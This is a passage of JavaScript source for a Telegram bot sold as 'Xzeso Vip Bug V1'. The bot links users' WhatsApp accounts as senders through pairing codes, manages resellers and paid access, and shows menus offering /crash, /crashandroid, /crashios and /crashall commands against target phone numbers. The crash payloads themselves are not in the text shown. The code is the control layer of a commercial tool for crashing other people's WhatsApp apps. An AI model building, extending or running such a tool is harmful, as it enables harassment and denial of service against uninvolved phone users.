          const exists = await checkSessionExistsForUser(userId);
          if (exists && waClients[userId]?.status === "open") {
            return ctx.reply("⚠️ Kamu sudah punya sesi WhatsApp aktif.", {
              parse_mode: "Markdown",
            });
          }

          const waitMessage = await ctx.reply(
            "⏳ *Memproses...*\nMembuat pairing code untukmu...",
            { parse_mode: "Markdown" }
          );
          await initWhatsappForUser(userId, true);
          waClients[userId].waitMessageId = waitMessage.message_id;

          await new Promise((r) => setTimeout(r, 800));
          const client = waClients[userId]?.sock;
          if (!client) {
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            return ctx.reply(
              "❌ Gagal menginisialisasi WhatsApp. Coba lagi nanti."
            );
          }

          if (typeof client.requestPairingCode === "function") {
            const code = await client.requestPairingCode(phone);
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            const pairingMessage = await ctx.reply(
              `✅ *Pairing Code Siap!*\n\n📱 *Nomor:* \`${phone}\`\n🔐 *Kode:* \`${code}\`\n\nMasukkan kode ini di aplikasi WhatsApp agar tersambung.`,
              { parse_mode: "Markdown" }
            );

            waClients[userId].pairingMessageId = pairingMessage.message_id;

            setTimeout(async () => {
              try {
                if (waClients[userId]?.status !== "open") {
                  await ctx.api.sendMessage(
                    userId,
                    "⏰ *Pairing Code Expired*\nSilahkan minta ulang dengan `/reqpair`.",
                    { parse_mode: "Markdown" }
                  );
                  if (waClients[userId]) {
                    try {
                      await waClients[userId].sock.end();
                    } catch {}
                    delete waClients[userId];
                  }
                }
              } catch (e) {
                log.error(`Timeout handler for ${userId}: ${e.message}`);
              }
            }, 60 * 1000);
          } else {
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            return ctx.reply(
              "⚠️ Baileys build kamu tidak support pairing API."
            );
          }
        } catch (err) {
          log.error(`Pairing failed for ${userId}: ${err.message}`);
          await ctx.reply(
            "❌ *Gagal Pairing*\nTerjadi kesalahan tak terduga.",
            { parse_mode: "Markdown" }
          );
        }
        break;
      }

      case "listpair": {
        try {
          const userId = ctx.from.id.toString();

          let result = "📌 *Daftar Sender WhatsApp Terhubung*\n";
          result += "═══════════════════════════════════\n\n";
          let count = 0;

          for (const uid in waClients) {
            const clientData = waClients[uid];

            if (!clientData || clientData?.status !== "open") continue;

            const sock = clientData?.sock;
            if (!sock) continue;

            count++;

            try {
              const authState = sock?.authState;
              const creds = authState?.creds || {};
              const me = creds?.me || {};

              const userJid = sock?.user?.id || me?.id || sock?.user?.jid || "";
              const socketUser = sock?.user || {};

              let phoneNumber = clientData?.phone || "Unknown";
              if (userJid && userJid.includes("@")) {
                phoneNumber = userJid.split("@")[0];
              }

              const deviceModel =
                me?.device ||
                socketUser?.device ||
                creds?.platformDisplayName ||
                "Unknown";
              const deviceName =
                me?.name || socketUser?.name || creds?.deviceModel || "Unknown";
              const platform =
                creds?.platform || socketUser?.platform || "WhatsApp";

              let waVersion = "Unknown";
              if (creds?.waVersion) {
                waVersion = Array.isArray(creds.waVersion)
                  ? creds.waVersion.join(".")
                  : creds.waVersion.toString();
              }

              let deviceId = "Unknown";
              try {
                if (creds?.signedIdentityKey?.public) {
                  const keyBuffer = Buffer.isBuffer(
                    creds.signedIdentityKey.public
                  )
                    ? creds.signedIdentityKey.public
                    : Buffer.from(creds.signedIdentityKey.public);
                  deviceId = keyBuffer
                    .toString("hex")
                    .slice(0, 16)
                    .toUpperCase();
                } else if (typeof creds?.signedIdentityKey === "string") {
                  deviceId = creds.signedIdentityKey.slice(0, 16).toUpperCase();
                } else if (creds?.me?.id) {
                  deviceId = creds.me.id
                    .split(":")[0]
                    .slice(0, 16)
                    .toUpperCase();
                }
              } catch (keyErr) {
                deviceId = "HASH_ERROR";
              }

              const lastSync = creds?.lastAccountSyncTimestamp
                ? new Date(creds.lastAccountSyncTimestamp).toLocaleString(
                    "id-ID"
                  )
                : "Never synced";

              let telegramName = "Unknown User";
              let telegramUsername = "No Username";

              try {
                const telegramData = await ctx.api
                  .getChat(uid)
                  .catch(() => null);
                if (telegramData) {
                  telegramName =
                    telegramData?.first_name ||
                    telegramData?.title ||
                    "Unknown";
                  telegramUsername = telegramData?.username
                    ? `@${telegramData.username}`
                    : "No Username";
                }
              } catch (tgErr) {}

              const connectionStatus =
                clientData?.status === "open" ? "✅ Aktif" : "❌ Offline";

              result +=
                `⚡ *SENDER LIST NO. ${count}*\n` +
                `────────────────────────────────────\n` +
                `👤 *Telegram : ${telegramName}*\n` +
                `🔑 *TG ID : \`${uid}\`*\n` +
                `🌐 *Username : ${telegramUsername}*\n` +
                `\n` +
                `📱 *WhatsApp : \`${phoneNumber}\`*\n` +
                `📟 *Nama Device : ${deviceName}*\n` +
                `🔧 *Tipe Device : ${deviceModel}*\n` +
                `💻 *Platform : ${platform}*\n` +
                `📦 *Versi WA : ${waVersion}*\n` +
                `🔐 *Device Hash : \`${deviceId}\`*\n` +
                `⏱️ *Last Sync : ${lastSync}*\n` +
                `🔗 *Status : ${connectionStatus}*\n` +
                `\n`;
            } catch (innerErr) {
              log.error(`[LISTPAIR] Error client ${uid}: ${innerErr.message}`);

              result +=
                `⚡ *SENDER LIST NO. ${count}*\n` +
                `👤 *User ID : \`${uid}\`*\n` +
                `🔗 *Status : ✅ Connected (Data partial)*\n` +
                `⚠️ *Note : Session sedang tersinkronisasi*\n\n`;
            }
          }

          if (count === 0) {
            return ctx.reply(
              "ℹ️ *Tidak Ada Sender Aktif*\n\nBelum ada WhatsApp yang terhubung. Gunakan `/reqpair` untuk menambahkan sender baru.",
              { parse_mode: "Markdown" }
            );
          }

          result += `═══════════════════════════════════\n`;
          result += `📊 *Total Sender Aktif:* ${count}\n`;
          result += `📅 *Check Time:* ${new Date().toLocaleString("id-ID")}`;

          await ctx.reply(result, { parse_mode: "Markdown" });
        } catch (e) {
          log.error(`[LISTPAIR] Critical error: ${e.message}`);
          await ctx.reply(
            "❌ *Terjadi Kesalahan*\n\nGagal membaca data sender.",
            { parse_mode: "Markdown" }
          );
        }
        break;
      }

      case "clearsesi": {
        try {
          let targetUserId = userId;
          if (args[0] && isOwner(userId)) {
            targetUserId = args[0];
          }

          const client = waClients[targetUserId];
          if (!client) {
            return ctx.reply(
              "⚠️ Tidak ada sesi WhatsApp aktif untuk user ini.",
              { parse_mode: "Markdown" }
            );
          }

          if (client.sock?.end) {
            await client.sock.end().catch(() => {});
          }

          delete waClients[targetUserId];

          await ctx.reply(
            `✅ Sesi WhatsApp untuk user ${targetUserId} telah dihapus.`,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          log.error(`Failed to clear session for ${userId}: ${err.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat menghapus sesi.", {
            parse_mode: "Markdown",
          });
        }
        break;
      }

      case "broadcast": {
        const userId = ctx.from.id.toString();
        if (!isOwner(ctx.from.id) && !isReseller(ctx.from.id))
          return ctx.reply("❌ Hanya reseller yang bisa akses!");
        const msg = args.join(" ");
        if (!msg) {
          log.warning("Empty broadcast message");
          return ctx.reply("⚠️ Use /broadcast <pesan>");
        }
        const users = JSON.parse(
          fs.readFileSync("database/users.json", "utf8")
        );
        log.loading(
          `Broadcasting message to ${chalk.yellow(users.length)} users...`
        );
        let ok = 0,
          fail = 0;
        for (const id of users) {
          try {
            await ctx.api.sendMessage(id, msg);
            ok++;
          } catch {
            fail++;
          }
        }
        log.success(
          `Broadcast completed: ${chalk.green(ok)} sent, ${chalk.red(
            fail
          )} failed`
        );
        ctx.reply(`✅ Sent: ${ok}\n❌ Failed: ${fail}`);
        break;
      }

      case "addacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Hanya owner & reseller!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /addacces <userId>");

        const access = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
        if (access.users.includes(target))
          return ctx.reply("⚠️ User sudah memiliki access!");

        access.users.push(target);
        fs.writeFileSync("./storage/access.json", JSON.stringify(access, null, 2));

        ctx.reply(`✅ Access ditambahkan untuk ${target}`);
        break;
      }
      
      case "free": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const settings = JSON.parse(fs.readFileSync("./database/settings.json", "utf8"));

        settings.freeMode = !settings.freeMode;
        fs.writeFileSync("./database/settings.json", JSON.stringify(settings, null, 2));

        if (settings.freeMode) {
          ctx.reply(
            "🟢 *Free Mode Active*\nAll users can now use all commands.",
            { parse_mode: "Markdown" }
          );
        } else {
          ctx.reply(
            "🔒 *Free Mode nonaktifkan*\nOnly premium users owner reseller can use the bot If you want to buy premium DM Owner @Xzeso13",
            { parse_mode: "Markdown" }
          );
        }

        break;
      }

      case "delacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Hanya owner & reseller!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /delacces <userId>");

        let access = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
        access.users = access.users.filter(x => x !== target);
        fs.writeFileSync("./storage/access.json", JSON.stringify(access, null, 2));

        ctx.reply(`🗑 Access user ${target} dihapus`);
        break;
      }

      case "listacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Hanya owner & reseller!");

        const access = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
        if (access.users.length < 1)
          return ctx.reply("📭 List access kosong");

        ctx.reply(
          `📌 List Access:\n${access.users.map(x => `• ${x}`).join("\n")}`
        );
        break;
      }

      case "address": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /addres <userId>");

        addReseller(target);
        ctx.reply(`🟢 Reseller ditambahkan: ${target}`);
        break;
      }

      case "delress": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /delres <userId>");

        removeReseller(target);
        ctx.reply(`🔴 Reseller dihapus: ${target}`);
        break;
      }

      case "listress": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const db = JSON.parse(fs.readFileSync("./storage/resellers.json", "utf8"));
        if (db.users.length < 1)
          return ctx.reply("📭 List reseller kosong");

        ctx.reply(
          `📌 List Reseller:\n${db.users.map(x => `• ${x}`).join("\n")}`
        );
        break;
      }

      default:
        log.warning(`Unknown command: ${command}`);
    }
  } catch (err) {
    log.error(`An Error Occurred: ${err.message}`);
    try {
      await bot.api.sendMessage(
        config.ownerId,
        `An error occurred: ${err.message}`,
        {
          parse_mode: "Markdown",
        }
      );
    } catch {}
  }
});

// ============================================================
// 🔘 CALLBACK QUERY HANDLERS
// ============================================================

bot.callbackQuery("open_allaccess", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `
<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「 Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @Xzeso13
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

<b> All Accsess Menu</b>
- clearsesi
- reqpair
- broadcast
- listpair
- addacces
- address
- delacces
- listaccess
- cdon
- cdoff
- setcd

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @Xzeso13 for assistance
</blockquote>
`.trim();

    const keyboard = new InlineKeyboard()
      .text("𝘽𝙐𝙂 𝘿𝙀𝙇𝘼𝙔", "bug_spam")
      .text("🎭 forceclose", "bug_crash")
      .row()
      .text("🔥 bàck-máin", "back_to_main");

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in open_allaccess: ${error.message}`);
    await ctx
      .answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true })
      .catch(() => {});
  }
});

bot.callbackQuery("open_allmenu", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `
<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「 Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @Xzeso13
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

You've successfully connected to the official bot of <b>adji pgstu</b>
Explore the tools and commands below. 🔥 Choose one of the menus below to begin your journey.

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @Xzeso13 for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
      .text("🦠 CRASH", "bug_crash")
      .text("📊 STATUS", "bug_status")
      .row()
      .text("🔥 bàck-máin", "back_to_main");

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in open_allmenu: ${error.message}`);
    await ctx
      .answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true })
      .catch(() => {});
  }
});

bot.callbackQuery("bug_crash", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();
    
    const caption = `
<b>🦠 قائمة الكراش المحدثة</b>

📌 *الأوامر المتاحة:*

1️⃣ /crash 628xxx - كراش متقدم (جميع الأنواع)
2️⃣ /crashandroid 628xxx - كراش أندرويد فقط
3️⃣ /crashios 628xxx - كراش iOS فقط
4️⃣ /crashall 628xxx - تنفيذ جميع الأنواع دفعة واحدة

━━━━━━━━━━━━━━━━━━
⚠️ *ملاحظة:* يجب ربط واتساب أولاً عبر /reqpair
━━━━━━━━━━━━━━━━━━

📞 الدعم: @Xzeso13
    `;

    const keyboard = new InlineKeyboard()
      .text("⬅️ رجوع", "open_allmenu");

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in bug_crash: ${error.message}`);
  }
});

bot.callbackQuery("bug_status", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();
    
    const userId = ctx.from.id.toString();
    const clientEntry = waClients[userId];
    const status = clientEntry?.status || "❌ غير متصل";
    const sessionExists = await checkSessionExistsForUser(userId);
    
    const caption = `
📊 *حالة البوت*

━━━━━━━━━━━━━━━━━━
👤 *المستخدم:* ${ctx.from.username || ctx.from.first_name}
🆔 *الرقم:* \`${userId}\`

📱 *واتساب:*
├ الحالة: ${status}
├ جلسة: ${sessionExists ? "✅ موجودة" : "❌ غير موجودة"}
└ عدد الجلسات النشطة: ${Object.keys(waClients).filter(k => waClients[k]?.status === "open").length}

🤖 *البوت:*
├ وقت التشغيل: ${formatUptime(process.uptime())}
└ الذاكرة المستخدمة: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB

━━━━━━━━━━━━━━━━━━
📞 الدعم: @Xzeso13
    `;

    const keyboard = new InlineKeyboard()
      .text("🔄 تحديث", "bug_status")
      .row()
      .text("⬅️ رجوع", "open_allmenu");

    await ctx.editMessageCaption(caption, {
      parse_mode: "Markdown",
      reply_markup: keyboard
    });
  } catch (error) {
    log.error(`Error in bug_status: ${error.message}`);
  }
});

bot.callbackQuery("back_to_main", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${username}</i></b>

<b>「 Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @Xzeso13
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @Xzeso13 for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
      .text("🦠 CRASH", "bug_crash")
      .text("📊 STATUS", "bug_status")
      .row()
      .url("👀 قناة", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in back_to_main: ${error.message}`);
  }
});

bot.on("callback_query", async (ctx) => {
  try {
    const data = ctx.callbackQuery.data;
    const userId = ctx.from.id.toString();

    if (data === "clearsender_confirm") {
      const processingMsg = await ctx.reply(
        "🔄 *Memulai Proses Clearing...*\n\n⏳ Menghapus semua session...",
        { parse_mode: "Markdown" }
      );

      await clearAllSessions();

      await ctx.api.editMessageText(
        userId,
        processingMsg.message_id,
        "✅ *Semua Session Dihapus!*\n\n🔄 Restarting bot dalam 2 detik...",
        { parse_mode: "Markdown" }
      );

      setTimeout(() => {
        log.warning("🔄 Bot restarting berdasarkan /clearsender command...");
        process.exit(0);
      }, 2000);
    } else if (data === "clearsender_cancel") {
      await ctx.deleteMessage();
      await ctx.reply("❌ *Pembatalan Sukses*\n\nProses clearing dibatalkan.", {
        parse_mode: "Markdown",
      });
    }

    await ctx.answerCallbackQuery();
  } catch (err) {
    log.error(`Error in callback_query: ${err.message}`);
  }
});

// ============================================================
// 🛠 UTILITY FUNCTIONS
// ============================================================

function formatUptime(sec) {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  return `${h}h ${m}m ${s}s`;
}

function checkCommandAccess(userId, command) {
  return hasAccess(userId) || isOwner(userId) || isReseller(userId);
}

function getNoAccessMessage(userId) {
  return "🔒 *Access Denied*\n\nYou don't have permission to use this command.";
}

// ============================================================
// 📌 PROCESS HANDLERS
// ============================================================

process.on("unhandledRejection", async (reason, promise) => {
  log.error(`Unhandled Rejection: ${reason}`);
  try {
    await bot.api.sendMessage(
      config.ownerId,
      `⚠️ *Unhandled Rejection*\n\n${reason}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch {}
});

process.on("uncaughtException", async (err) => {
  log.error(`Uncaught Exception: ${err.message}`);
  try {
    await bot.api.sendMessage(
      config.ownerId,
      `🔥 *Uncaught Exception*\n\n${err.message}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch {}
});

process.on("uncaughtExceptionMonitor", (err, origin) => {
  log.error(`Uncaught Exception Monitor: ${err.message} | Origin: ${origin}`);
});

process.on("rejectionHandled", (promise) => {
  log.warning("A previously unhandled rejection was handled later.");
});

async function fetchValidTokens() {
  try {
    const url = `https://api.github.com/repos/adjiepangestu-ux/XINSOOGLOBAL/contents/${nama_file}`;
    const response = await axios.get(url, {
      headers: {
        Authorization: `token ${path_ghp}`,
        Accept: "application/vnd.github.v3+json"
      }
    });
    const contentBase64 = response.data.content;
    const jsonString = Buffer.from(contentBase64, "base64").toString("utf8");
    const data = JSON.parse(jsonString);
    return data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub API:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(
    chalk.blue(`Bot initialization started...`)
  );
}

// ============================================================
// 🚀 BOT START
// ============================================================

(async () => {
  try {
    console.clear();
    validateToken();
    log.system("Bot initialization started...");
    log.telegram("Telegram Bot with grammY is running!");
    log.success("All systems operational");
    
    const sessionFolders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];
      
    if (sessionFolders.length > 0) {
      log.loading(
        `Found ${sessionFolders.length} saved WhatsApp session(s). Attempting to reconnect...`
      );
      for (const folder of sessionFolders) {
        const userId = folder;
        try {
          await initWhatsappForUser(userId, false);
          log.whatsapp(`Attempting reconnect for user ${userId}`);
        } catch (err) {
          log.error(
            `Failed to reconnect session for ${userId}: ${err.message}`
          );
        }
      }
    } else {
      log.info("No saved WhatsApp sessions found. Fresh start.");
    }
    
    await bot.start();
    console.log(
      chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready to serve\n`)
    );
  } catch (err) {
    log.error(`An Error Occurred: ${err.message}`);
  }
})();